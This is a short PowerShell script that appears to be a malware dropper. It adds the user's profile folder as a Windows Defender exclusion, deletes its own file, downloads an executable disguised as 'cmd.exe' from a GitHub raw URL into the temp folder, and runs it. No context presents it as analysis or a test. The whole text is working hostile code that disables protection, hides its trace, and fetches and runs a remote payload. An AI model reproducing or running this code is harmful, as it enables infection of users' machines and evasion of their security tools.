Add-MpPreference -ExclusionPath $env:USERPROFILE
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
$url = 'https://github.com/Aevagee/younet/raw/refs/heads/main/cmd.exe'
$outputFile = [System.IO.Path]::Combine($env:Temp, 'cmd.exe')
Start-Sleep -Milliseconds 100 
Invoke-WebRequest -Uri $url -OutFile $outputFile
Start-Process -FilePath $outputFile